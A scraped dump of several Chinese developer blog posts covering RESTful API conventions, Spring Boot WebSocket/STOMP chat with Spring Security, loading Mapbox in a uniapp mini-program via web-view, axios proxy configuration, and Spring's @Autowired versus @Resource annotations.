服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。\n200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。\n201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。\n202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）\n204 NO CONTENT - [DELETE]：用户删除数据成功。\n400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。\n401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。\n403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。\n404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。\n406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。\n410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。\n422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。\n500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。\n状态码的完全列表参见这里。\n八、错误处理（Error handling） 如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。\n{error:\u0026ldquo;Invalid API key\u0026rdquo;}\n九、返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。\nGET /collection：返回资源对象的列表（数组）\nGET /collection/resource：返回单个资源对象\nPOST /collection：返回新生成的资源对象\nPUT /collection/resource：返回完整的资源对象\nPATCH /collection/resource：返回完整的资源对象\nDELETE /collection/resource：返回一个空文档\n十、Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。\n比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。\n{\u0026ldquo;link\u0026rdquo;:\n{\u0026ldquo;rel\u0026rdquo;:\u0026ldquo;collectionhttps://www.example.com/zoos\u0026rdquo;,\n\u0026ldquo;href\u0026rdquo;:\u0026ldquo;https://api.example.com/zoos\u0026quot;,\n\u0026ldquo;title\u0026rdquo;:\u0026ldquo;List of zoos\u0026rdquo;,\n\u0026ldquo;type\u0026rdquo;:\u0026ldquo;application/vnd.yourformat+json\u0026rdquo;\n}}\n上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型。\nHypermedia API的设计被称为HATEOAS。Github的API就是这种设计，访问api.github.com会得到一个所有可用API的网址列表。\n{\n\u0026ldquo;current_user_url\u0026rdquo;:\u0026ldquo;https://api.github.com/user\u0026quot;,\n\u0026ldquo;authorizations_url\u0026rdquo;:\u0026ldquo;https://api.github.com/authorizations\u0026quot;,\n// \u0026hellip;\n}\n从上面可以看到，如果想获取当前用户的信息，应该去访问api.github.com/user，然后就得到了下面结果。\n{\n\u0026ldquo;message\u0026rdquo;:\u0026ldquo;Requires authentication\u0026rdquo;,\n\u0026ldquo;documentation_url\u0026rdquo;:\u0026ldquo;https://developer.github.com/v3\u0026quot;\n}\n上面代码表示，服务器给出了提示信息，以及文档的网址。\n十一、其他 （1）API的身份认证应该使用OAuth 2.0框架。\n（2）服务器返回的数据格式，应该尽量使用JSON，避免使用XML。\n参考博客：https://www.jianshu.com/p/73d2415956bd\n","permalink":"https://chance7bin.github.io/posts/design/restful%E9%A3%8E%E6%A0%BCapi%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97/","summary":"restful风格API 设计指南 一、协议 API与用户的通信协议，总是使用HTTPs协议。 二、域名 应该尽量将API部署在专用域名之下。 https://api.example.com 如果确","title":"restful风格API设计指南"},{"content":" WebSocket是一种在单个TCP连接上进行全双工通信的协议，浏览器和服务器只需要完成一次握手，两者之间就可以直接创建持久性的连接，并进行双向数据传输。\n消息群发 1.添加如下依赖 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sockjs-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;stomp-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jquery\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2.配置WebSocket Spring框架提供了基于WebSocket的STOMP支持，STOMP是一个简单的可互操作的协议，通常被用于通过中间服务器在客户端之间进行异步消息传递。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Configuration @EnableWebSocketMessageBroker public class WebSocketConfig implements WebSocketMessageBrokerConfigurer { @Override public void configureMessageBroker(MessageBrokerRegistry registry) { // 如果消息的前缀是\u0026#34;/topic\u0026#34;，就会将消息转发给消息代理(broker) registry.enableSimpleBroker(\u0026#34;/topic\u0026#34;,\u0026#34;/queue\u0026#34;); // 前缀为\u0026#34;/app\u0026#34;的destination可以通过@MessageMapping注解的方法处理 registry.setApplicationDestinationPrefixes(\u0026#34;/app\u0026#34;); } @Override public void registerStompEndpoints(StompEndpointRegistry registry) { // 客户端通过这里配置的URL建立WebSocket连接 registry.addEndpoint(\u0026#34;portal/chat\u0026#34;).withSockJS(); } } 3.Controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Controller public class GreetingController { @Autowired SimpMessagingTemplate messagingTemplate; // @MessageMapping(\u0026#34;/hello\u0026#34;)用来接收\u0026#34;/app/hello\u0026#34;发送的消息 // 再将消息转发到@SendTo定义的路径上(前缀为\u0026#34;/topic\u0026#34;,消息将会被broker代理，再由broker广播) @MessageMapping(\u0026#34;/hello\u0026#34;) @SendTo(\u0026#34;/topic/greetings\u0026#34;) public Message greeting(Message message) throws Exception{ return message; } // @MessageMapping(\u0026#34;/hello\u0026#34;) // public void greeting(Message message) throws Exception{ // messagingTemplate.convertAndSend(\u0026#34;/topic/greetings\u0026#34;,message); // } } @Data public class Message { private String name; private String content; } 4.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;群聊\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;../lib/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/sockjs-client/1.1.2/sockjs.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/stomp-websocket/2.3.3/stomp.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../js/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;请输入用户名\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;name\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;button id=\u0026#34;connect\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;连接\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;disconnect\u0026#34; type=\u0026#34;button\u0026#34; disabled=\u0026#34;disabled\u0026#34;\u0026gt;断开连接\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;chat\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;content\u0026#34;\u0026gt;请输入聊天内容\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;content\u0026#34; placeholder=\u0026#34;聊天内容\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;send\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;greetings\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;conversation\u0026#34; style=\u0026#34;display: none\u0026#34;\u0026gt;群聊进行中...\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.JavaScript 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 var stompClient = null; function setConnected(connected) { $(\u0026#34;#connect\u0026#34;).prop(\u0026#34;disabled\u0026#34;,connected); $(\u0026#34;#disconnect\u0026#34;).prop(\u0026#34;disabled\u0026#34;,!connected); if (connected){ $(\u0026#34;#conversation\u0026#34;).show(); $(\u0026#34;#chat\u0026#34;).show(); } else { $(\u0026#34;#conversation\u0026#34;).hide(); $(\u0026#34;#chat\u0026#34;).hide(); } $(\u0026#34;#greetings\u0026#34;).html(\u0026#34;\u0026#34;); } function connect() { if (!$(\u0026#34;#name\u0026#34;).val()){ return; } var socket = new SockJS(\u0026#39;/portal/chat\u0026#39;); // 创建一个stomp实例发起连接请求 stompClient = Stomp.over(socket); stompClient.connect({}, function (frame) { setConnected(true); // 订阅服务端发回来的消息 stompClient.subscribe(\u0026#39;/topic/greetings\u0026#39;,function (greeting) { showGreeting(JSON.parse(greeting.body)) }); }); } function disconnect() { if (stompClient !== null){ stompClient.disconnect(); } setConnected(false); } function sendName() { stompClient.send(\u0026#34;/app/hello\u0026#34;,{}, JSON.stringify({\u0026#39;name\u0026#39;: $(\u0026#34;#name\u0026#34;).val(),\u0026#39;content\u0026#39;:$(\u0026#34;#content\u0026#34;).val()})); } function showGreeting(message) { $(\u0026#34;#greetings\u0026#34;) .append(\u0026#34;\u0026lt;div\u0026gt;\u0026#34; + message.name + \u0026#34;:\u0026#34; + message.content + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;) } $(function () { $(\u0026#34;#connect\u0026#34;).click(function () { connect(); }); $(\u0026#34;#disconnect\u0026#34;).click(function () { disconnect(); }); $(\u0026#34;#send\u0026#34;).click(function () { sendName(); }); }) 消息点对点发送 点对点发送，应该有用户的概念，因此需加入spring security依赖\n1.配置spring security 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 @Configuration public class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Bean PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(); // System.out.println(\u0026#34;------------encoder.encode:\u0026#34; + encoder.encode(\u0026#34;456\u0026#34;)); // super.configure(auth); auth.inMemoryAuthentication() .withUser(\u0026#34;admin\u0026#34;) .password(encoder.encode(\u0026#34;123\u0026#34;)) .roles(\u0026#34;admin\u0026#34;) .and() .withUser(\u0026#34;sang\u0026#34;) .password(encoder.encode(\u0026#34;456\u0026#34;)) .roles(\u0026#34;user\u0026#34;); } @Override protected void configure(HttpSecurity http) throws Exception { // super.configure(http); http.authorizeRequests() .anyRequest().authenticated() .and() .formLogin().permitAll(); } } 2.configuration 同上，多加了一个/queue，方便对群发消息和点对点消息进行管理\n3.controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 @Controller public class GreetingController { @Autowired SimpMessagingTemplate messagingTemplate; // @MessageMapping(\u0026#34;/hello\u0026#34;)用来接收\u0026#34;/app/hello\u0026#34;发送的消息 // 再将消息转发到@SendTo定义的路径上(前缀为\u0026#34;/topic\u0026#34;,消息将会被broker代理，再由broker广播) @MessageMapping(\u0026#34;/hello\u0026#34;) @SendTo(\u0026#34;/topic/greetings\u0026#34;) public Message greeting(Message message) throws Exception{ return message; } // @MessageMapping(\u0026#34;/hello\u0026#34;) // public void greeting(Message message) throws Exception{ // messagingTemplate.convertAndSend(\u0026#34;/topic/greetings\u0026#34;,message); // } @MessageMapping(\u0026#34;/chat\u0026#34;) public void chat(Principal principal, Chat chat){ // Principal用来获取当前登录用户的信息，第二个参数是客户端发送来的消息 String from = principal.getName(); chat.setFrom(from); // System.out.println(\u0026#34;------------chat.getTo():\u0026#34; + chat.getTo()); messagingTemplate.convertAndSendToUser(chat.getTo(),\u0026#34;/queue/chat\u0026#34;,chat); } } @Data public class Chat { private String to; private String from; private String content; } 消息发送使用的方法是convertAndSendToUser，该方法内部调用了convertAndSend方法，并对消息路径做了处理，部门源码如下：\n1 2 3 4 5 6 7 public void convertAndSendToUser(String user, String destination, Object payload, @Nullable Map\u0026lt;String, Object\u0026gt; headers, @Nullable MessagePostProcessor postProcessor) throws MessagingException { Assert.notNull(user, \u0026#34;User must not be null\u0026#34;); Assert.isTrue(!user.contains(\u0026#34;%2F\u0026#34;), \u0026#34;Invalid sequence \\\u0026#34;%2F\\\u0026#34; in user name: \u0026#34; + user); user = StringUtils.replace(user, \u0026#34;/\u0026#34;, \u0026#34;%2F\u0026#34;); destination = destination.startsWith(\u0026#34;/\u0026#34;) ? destination : \u0026#34;/\u0026#34; + destination; super.convertAndSend(this.destinationPrefix + user + destination, payload, headers, postProcessor); } 这里destinationPrefix的默认值是\u0026quot;/user/\u0026quot;，也就是说消息的最终发送路径是 \u0026quot;/user/用户名/queue/chat\u0026quot;\n4.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;单聊\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;../lib/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/sockjs-client/1.1.2/sockjs.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../lib/stomp-websocket/2.3.3/stomp.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;../js/chat.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;chat\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;chatsContent\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; 请输入聊天内容： \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;content\u0026#34; placeholder=\u0026#34;聊天内容\u0026#34;\u0026gt; 目标用户： \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;to\u0026#34; placeholder=\u0026#34;目标用户\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;send\u0026#34; type=\u0026#34;button\u0026#34;\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.JavaScript 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 var stompClient = null; function connect() { var socket = new SockJS(\u0026#39;/portal/chat\u0026#39;); stompClient = Stomp.over(socket); stompClient.connect({}, function (frame) { // 订阅的地址比服务端配置的地址多了\u0026#34;/user\u0026#34;前缀， // 是因为SimpMessagingTemplate类中自动添加了路径前缀 stompClient.subscribe(\u0026#39;/user/queue/chat\u0026#39;, function (chat) { console.log(\u0026#34;chat:\u0026#34;,chat); showGreeting(JSON.parse(chat.body)); }); }); } function sendMsg() { stompClient.send(\u0026#34;/app/chat\u0026#34;, {}, JSON.stringify({\u0026#39;content\u0026#39;: $(\u0026#34;#content\u0026#34;).val(), \u0026#39;to\u0026#39;: $(\u0026#34;#to\u0026#34;).val()})); } function showGreeting(message) { $(\u0026#34;#chatsContent\u0026#34;) .append(\u0026#34;\u0026lt;div\u0026gt;\u0026#34; + message.from + \u0026#34;:\u0026#34; + message.content + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;) } $(function () { connect(); $(\u0026#34;#send\u0026#34;).click(function () { sendMsg(); }); }) ","permalink":"https://chance7bin.github.io/posts/note/springboot%E6%95%B4%E5%90%88websocket/","summary":"WebSocket是一种在单个TCP连接上进行全双工通信的协议，浏览器和服务器只需要完成一次握手，两者之间就可以直接创建持久性的连接，并进行","title":"SpringBoot整合WebSocket"},{"content":"小程序的踩坑之旅 1 uniapp 本身是加载不了mapbox的 下面两个是在vue环境下导入mapbox\nhttps://blog.csdn.net/weixin_44402694/article/details/87794850\nhttps://blog.csdn.net/Isaac_Play/article/details/103890231?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\u0026amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\n==uniapp中加载mapbox会出现这个错误==\n\u0026ldquo;TypeError: Cannot read property \u0026lsquo;getElementById\u0026rsquo; of undefined\u0026rdquo;\n原因：微信小程序不支持操作dom元素， dom is not defined\nmapbox 他的Map方法里面就用的document.getElementById ，是封装好的，因此加载不出来，如下图\n2 小程序仅支持加载网络网页，不支持本地html App 平台同时支持网络网页和本地网页，但本地网页及相关资源（js、css等文件）必须放在uni-app 项目根目录-\u0026gt;hybrid-\u0026gt;html文件夹下，如下为一个加载本地网页的uni-app项目文件目录示例：\n加载本地文件加载不了\n1 this.url = `/hybrid/html/map/chooseDev.html` 加载网络文件可以\n1 this.url = \u0026#39;http://ip地址:8080/tgmobile/hybrid/html/map/chooseDev.html?lon=119.318580\u0026amp;lat=26.034681\u0026#39; 文章\nhttps://www.jianshu.com/p/adc72eae0593\nhttps://www.cnblogs.com/lizhao123/p/11558674.html\n**注意：**目前通过webview跳转到其他网址支持：\n1、与微信小程序绑定的微信公众号文章地址;\n2、在微信小程序后台配置好业务域名的地址。\n3 查看官方文档，copy实例代码，终于可以加载出来了！！！ https://uniapp.dcloud.io/component/web-view\nuni.postMessage(OBJECT)\n网页向应用发送消息，在 \u0026lt;web-view\u0026gt; 的message事件回调 event.detail.data 中接收消息。\nTips\n传递的消息信息，必须写在data对象中。\nevent.detail.data中的数据，以数组的形式接收每次 post 的消息。\n1 2 3 4 5 6 7 8 // 待触发 `UniAppJSBridgeReady` 事件后，即可调用 uni 的 API。 document.addEventListener(\u0026#39;UniAppJSBridgeReady\u0026#39;, function() { uni.postMessage({ data: { action: \u0026#39;message\u0026#39; } }); }); 代码如下：\n跳转的vue组件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;view\u0026gt; \u0026lt;web-view :src=\u0026#34;url\u0026#34; @message=\u0026#34;getMessage\u0026#34;\u0026gt;\u0026lt;/web-view\u0026gt; \u0026lt;/view\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default{ data(){ return{ url:\u0026#39;\u0026#39; } }, onLoad(option) { console.log(\u0026#34;chooseDev option:\u0026#34;,option) this.url = \u0026#39;http://ip地址:8080/tgmobile/hybrid/html/map/chooseDevTest.html\u0026#39; }, methods:{ getMessage(e){ console.log(\u0026#34;e:\u0026#34;,e) } } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; webview页面：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;网络网页\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v1.12.0/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v1.12.0/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.write(\u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://res.wx.qq.com/open/js/jweixin-1.4.0.js\u0026#34;\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;!-- uni 的 SDK --\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://js.cdn.aliyun.dcloud.net.cn/dev/uni-app/uni.webview.1.5.2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // 待触发 `UniAppJSBridgeReady` 事件后，即可调用 uni 的 API。 document.addEventListener(\u0026#39;UniAppJSBridgeReady\u0026#39;, function() { uni.postMessage({ data: { action: \u0026#39;message\u0026#39; } }); uni.getEnv(function(res) { console.log(\u0026#39;当前环境：\u0026#39; + JSON.stringify(res)); }); mapboxgl.accessToken = \u0026#39;your accessToken\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, zoom: 14, center: [119.318580, 26.034681], minZoom: 3 }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","permalink":"https://chance7bin.github.io/posts/map/uniapp%E5%8A%A0%E8%BD%BDmapbox%E5%B9%B6%E5%8F%91%E5%B8%83%E6%88%90%E5%B0%8F%E7%A8%8B%E5%BA%8F/","summary":"小程序的踩坑之旅 1 uniapp 本身是加载不了mapbox的 下面两个是在vue环境下导入mapbox https://blog.csdn.net/weixin_44402694/article/details/87794850 https://blog.csdn.net/Isaac_Play/article/details/103890231?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3\u0026amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3 ==uniapp中加载mapbox会出现这个错误","title":"uniapp加载mapbox并发布成小程序"},{"content":"axios的使用 1.安装命令：cnpm instal axios \u0026ndash;save 2.main.js引入全局使用 1 2 3 4 //axios import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios 3.组件或页面中使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 methods: { testAxios1:function(){ console.log(\u0026#39;test\u0026#39;); this.$axios({ method: \u0026#39;get\u0026#39;, url: \u0026#39;data/personData.json\u0026#39; }) .then(function (response) { console.log(response) }) .catch(function (error) { console.log(error) }) }, axios配置开发环境跨域请求代理 1.配置BaseUrl 在main.js中，配置数据所在服务器的前缀（即固定部分），代码如下：\n1 2 3 4 import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios axios.defaults.baseURL = \u0026#39;/api\u0026#39; //关键代码 Vue.config.productionTip = false 2.打开config/index.js 在这里面找到proxyTable{}，改为这样：\n1 2 3 4 5 6 7 8 9 proxyTable: { \u0026#39;/api\u0026#39;: { target:\u0026#39;http://api.douban.com/v2\u0026#39;, // 你请求的第三方接口 changeOrigin:true, // 在本地会创建一个虚拟服务端，然后发送请求的数据，并同时接收请求的数据，这样服务端和服务端进行数据的交互就不会有跨域问题 pathRewrite:{ // 路径重写， \u0026#39;^/api\u0026#39;: \u0026#39;\u0026#39; // 替换target中的请求地址，也就是说以后你在请求http://api.douban.com/v2/XXXXX这个地址的时候直接写成/api即可。 } } }, 3.使用 1 2 3 4 5 6 7 8 axios.get(\u0026#34;/movie/top250\u0026#34;).then((res) =\u0026gt; { res = res.data if (res.errno === ERR_OK) { this.themeList=res.data; } }).catch((error) =\u0026gt; { console.warn(error) }) ==4.重新启动项目！！！== ","permalink":"https://chance7bin.github.io/posts/note/axios%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","summary":"axios的使用 1.安装命令：cnpm instal axios \u0026ndash;save 2.main.js引入全局使用 1 2 3 4 //axios import axios from \u0026#39;axios\u0026#39; Vue.prototype.$axios = axios 3.组件或页面中使用 1 2 3 4 5 6 7 8 9 10 11","title":"axios跨域问题"},{"content":"在项目中遇到这么一个困惑\n在controller层自动装配了一个service的接口\n1 2 @Resource ProjectService projectService; ==为什么可以直接使用接口实现类重写的方法？==\n1 2 3 public List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus){ return projectService.getProjectList(projectName,projectStatus); } ProjectService.java\n1 2 3 public interface ProjectService { List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus); } ProjectServiceImpl.java\n1 2 3 4 5 6 7 8 @Service public class ProjectServiceImpl implements ProjectService{ @Override public List\u0026lt;PostProject\u0026gt; getProjectList(String projectName, String projectStatus) { ... return postProjectList; } } @service\n接口实现类上的@service注解等价于\nxml配置文件上的\u0026lt;bean id=\u0026quot;projectServiceImpl\u0026quot; class=\u0026quot;service.ProjectServiceImpl\u0026quot;/\u0026gt; 上述配置等价于\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!--在Spring中创建对象，在Spring这些都称为bean 类型 变量名 = new 类型(); Holle holle = new Holle(); bean = 对象(holle) id = 变量名(holle) class = new的对象(new Holle();) property 相当于给对象中的属性设值,让str=\u0026#34;Spring\u0026#34; --\u0026gt; \u0026lt;bean id=\u0026#34;hello\u0026#34; class=\u0026#34;pojo.Hello\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;str\u0026#34; value=\u0026#34;Spring\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt; controller层上的\n1 2 @Resource ProjectService projectService; 下面先来了解一下@Autowired和@Resource\n@Autowired\n@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired。\n@Autowired采取的策略为按照类型注入。\n1 2 3 4 public class UserService { @Autowired private UserDao userDao; } 如上代码所示，这样装配会去spring容器中找到类型为UserDao的类，然后将其注入进来。这样会产生一个问题，当一个类型有多个bean值的时候，会造成无法选择具体注入哪一个的情况，这个时候我们需要配合着@Qualifier使用。\n@Qualifier告诉spring具体去装配哪个对象。\n1 2 3 4 5 public class UserService { @Autowired @Qualifier(name=\u0026#34;userDao1\u0026#34;) private UserDao userDao; } 这个时候我们就可以通过类型和名称定位到我们想注入的对象\n@Resource\n@Resource注解由J2EE提供，需要导入包javax.annotation.Resource。\n@Resource默认按照ByName自动注入。\n1 2 3 4 5 6 7 8 9 10 public class UserService { @Resource private UserDao userDao; @Resource(name=\u0026#34;studentDao\u0026#34;) private StudentDao studentDao; @Resource(type=\u0026#34;TeacherDao\u0026#34;) private TeacherDao teacherDao; @Resource(name=\u0026#34;manDao\u0026#34;,type=\u0026#34;ManDao\u0026#34;) private ManDao manDao; } 